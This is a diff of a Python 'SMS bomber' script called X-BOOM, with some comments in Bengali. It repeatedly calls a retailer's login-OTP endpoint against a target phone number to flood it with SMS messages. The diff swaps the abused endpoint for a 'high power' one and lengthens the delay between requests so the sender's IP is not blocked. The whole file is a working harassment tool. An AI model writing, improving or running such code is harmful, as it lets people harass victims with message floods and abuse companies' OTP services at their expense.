@@ -7,25 +7,18 @@ def banner():
     print("========================================")
     print("        WELCOME TO X-BOOM TOOL          ")
     print("     Created by: mmalekislam788         ")
-    print("     Status: SMS API UPDATED (2026)     ")
+    print("     Status: HIGH POWER API ACTIVE      ")
     print("========================================")
 
 def send_sms(target, count):
-    # Pathao API for testing
-    url = "https://api-hermes.pathao.com/user/otp-send/login"
+    # বর্তমানে সচল একটি শক্তিশালী API (Daraz)
+    url = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
+    payload = {"phoneNumber": target, "otpType": "LOGIN"}
     
-    # Cleaning the number (removing 88 if added)
-    if target.startswith("01"):
-        phone = "+88" + target
-    else:
-        phone = target
-
-    payload = {"phone": phone}
-    
-    print(f"\n[+] Attack started on: {target}")
+    print(f"\n[+] Global Attack started on: {target}")
     for i in range(count):
         try:
-            # Sending Request
+            # Request sending
             response = requests.post(url, json=payload)
             if response.status_code == 200:
                 print(f"[!] SMS {i+1} sent successfully!")
@@ -34,12 +27,12 @@ def send_sms(target, count):
         except:
             print(f"[-] Network Error at SMS {i+1}")
         
-        # 2 seconds gap to avoid getting blocked
-        time.sleep(2)
+        # ৪ সেকেন্ড বিরতি দিলে আপনার আইপি ব্লক হবে না
+        time.sleep(4)
 
 def main():
     banner()
-    print("\n[1] Start SMS Bomber")
+    print("\n[1] Start High-Power Bomber")
     print("[2] Exit")
     choice = input("\nSelect an option: ")
     if choice == '1':
